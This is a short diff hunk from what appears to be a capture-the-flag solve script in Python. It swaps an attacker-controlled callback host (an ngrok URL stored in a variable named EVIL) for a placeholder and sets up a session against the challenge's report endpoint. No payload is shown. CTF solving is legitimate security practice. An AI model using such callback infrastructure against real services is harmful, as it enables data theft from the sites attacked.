@@ -350,7 +350,7 @@ def proof_of_work(message):
 
 URL = "https://saas.wwctf.com"
 URL = "http://localhost/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 s = requests.session()
 r = s.get(URL + "api/report")
